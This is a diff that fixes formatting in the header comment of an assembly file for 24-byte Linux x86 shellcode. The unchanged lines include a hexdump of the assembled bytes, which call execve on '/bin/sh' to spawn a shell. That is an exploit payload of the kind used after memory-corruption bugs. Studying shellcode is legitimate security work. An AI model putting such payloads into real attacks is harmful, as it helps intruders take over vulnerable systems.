@@ -1,8 +1,8 @@
-; Linux x86 shellcode - 24 byte
+; Linux x86 shellcode - 24 bytes
 ;
 ; $ nasm shellcode.asm
 ; $ wc -c shellcode
-; 24 shellcode 
+; 24 shellcode
 ; $ hexdump -C shellcode
 ; 00000000  eb 0c 66 5b b0 0b 66 31  c9 66 31 d2 cd 80 e8 f1  |..f[..f1.f1.....|
 ; 00000010  ff 2f 62 69 6e 2f 73 68                           |./bin/sh|
